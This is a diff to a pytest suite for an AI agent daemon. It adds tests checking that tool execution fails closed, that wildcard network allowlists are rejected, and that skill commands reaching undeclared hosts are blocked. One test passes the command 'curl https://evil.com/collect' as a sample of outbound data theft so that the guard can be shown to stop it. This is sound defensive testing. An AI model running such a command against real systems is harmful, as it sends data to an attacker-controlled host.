@@ -73,6 +73,19 @@ def model_env(monkeypatch: pytest.MonkeyPatch) -> None:
 
 
 async def _start_daemon(tmp_path: Path) -> tuple[asyncio.Task[None], ControlClient]:
+    return await _start_daemon_with_policy(tmp_path, policy=None)
+
+
+async def _start_daemon_with_policy(
+    tmp_path: Path,
+    *,
+    policy: dict[str, Any] | None,
+) -> tuple[asyncio.Task[None], ControlClient]:
+    if policy is not None:
+        (tmp_path / "policy.yaml").write_text(
+            yaml.safe_dump(policy, sort_keys=False),
+            encoding="utf-8",
+        )
     config = DaemonConfig(
         data_dir=tmp_path / "data",
         socket_path=tmp_path / "control.sock",
@@ -98,7 +111,10 @@ async def test_m4_t10_skill_with_undeclared_capability_blocked_at_runtime(
     model_env: None,
     tmp_path: Path,
 ) -> None:
-    daemon_task, client = await _start_daemon(tmp_path)
+    daemon_task, client = await _start_daemon_with_policy(
+        tmp_path,
+        policy={"skills": {"require_signature_for_auto_install": False}},
+    )
     try:
         skill_manifest = _manifest_payload(name="runtime-guard-skill")
         skill_manifest["capabilities"]["network"] = [
@@ -140,7 +156,10 @@ async def test_m4_t11_skill_update_requires_review_when_policy_demands(
     model_env: None,
     tmp_path: Path,
 ) -> None:
-    daemon_task, client = await _start_daemon(tmp_path)
+    daemon_task, client = await _start_daemon_with_policy(
+        tmp_path,
+        policy={"skills": {"require_signature_for_auto_install": False}},
+    )
     try:
         v1 = _write_skill(
             tmp_path / "update_v1",
@@ -208,6 +227,118 @@ async def test_m4_rr9_tool_execute_unknown_tool_rejected(
                     "command": [sys.executable, "-c", "print('noop')"],
                 },
             )
+    finally:
+        await _shutdown(daemon_task, client)
+
+
+@pytest.mark.asyncio
+async def test_m4_rr10_default_tool_execute_omission_uses_fail_closed_posture(
+    model_env: None,
+    tmp_path: Path,
+) -> None:
+    daemon_task, client = await _start_daemon(tmp_path)
+    try:
+        created = await client.call("session.create", {"channel": "cli"})
+        sid = created["session_id"]
+        result = await client.call(
+            "tool.execute",
+            {
+                "session_id": sid,
+                "tool_name": "shell.exec",
+                "command": [sys.executable, "-c", "print('ok')"],
+                "sandbox_type": "vm",
+            },
+        )
+        assert result["allowed"] is False
+        assert result["reason"] == "degraded_enforcement"
+    finally:
+        await _shutdown(daemon_task, client)
+
+
+@pytest.mark.asyncio
+async def test_m4_rr11_http_request_requires_explicit_non_wildcard_allowlist(
+    model_env: None,
+    tmp_path: Path,
+) -> None:
+    daemon_task, client = await _start_daemon(tmp_path)
+    try:
+        created = await client.call("session.create", {"channel": "cli"})
+        sid = created["session_id"]
+        with pytest.raises(
+            RuntimeError,
+            match=r"http_request wildcard domains are not allowed",
+        ):
+            await client.call(
+                "tool.execute",
+                {
+                    "session_id": sid,
+                    "tool_name": "http_request",
+                    "command": [sys.executable, "-c", "print('noop')"],
+                    "network_urls": ["https://api.good.com/v1"],
+                    "degraded_mode": "fail_open",
+                    "security_critical": False,
+                },
+            )
+        with pytest.raises(RuntimeError, match=r"http_request wildcard domains are not allowed"):
+            await client.call(
+                "tool.execute",
+                {
+                    "session_id": sid,
+                    "tool_name": "http_request",
+                    "command": [sys.executable, "-c", "print('noop')"],
+                    "network_urls": ["https://api.good.com/v1"],
+                    "network": {"allow_network": True, "allowed_domains": ["*"]},
+                    "degraded_mode": "fail_open",
+                    "security_critical": False,
+                },
+            )
+    finally:
+        await _shutdown(daemon_task, client)
+
+
+@pytest.mark.asyncio
+async def test_m4_rr12_skill_runtime_extracts_network_hosts_from_command_tokens(
+    model_env: None,
+    tmp_path: Path,
+) -> None:
+    daemon_task, client = await _start_daemon_with_policy(
+        tmp_path,
+        policy={"skills": {"require_signature_for_auto_install": False}},
+    )
+    try:
+        skill_manifest = _manifest_payload(name="token-url-guard")
+        skill_manifest["capabilities"]["network"] = [
+            {"domain": "api.good.com", "reason": "api"}
+        ]
+        skill_manifest["capabilities"]["shell"] = [
+            {"command": "curl", "reason": "fetch"},
+        ]
+        skill = _write_skill(
+            tmp_path / "token_url_guard",
+            manifest=skill_manifest,
+            files={"SKILL.md": "safe helper"},
+        )
+        decision = await client.call(
+            "skill.install",
+            {"skill_path": str(skill), "approve_untrusted": True},
+        )
+        assert decision["status"] == "installed"
+
+        created = await client.call("session.create", {"channel": "cli"})
+        sid = created["session_id"]
+        result = await client.call(
+            "tool.execute",
+            {
+                "session_id": sid,
+                "skill_name": "token-url-guard",
+                "tool_name": "shell_exec",
+                "command": ["curl", "https://evil.com/collect"],
+                "degraded_mode": "fail_open",
+                "security_critical": False,
+            },
+        )
+        assert result["allowed"] is False
+        assert "undeclared_network:evil.com" in str(result["reason"])
     finally:
         await _shutdown(daemon_task, client)
 
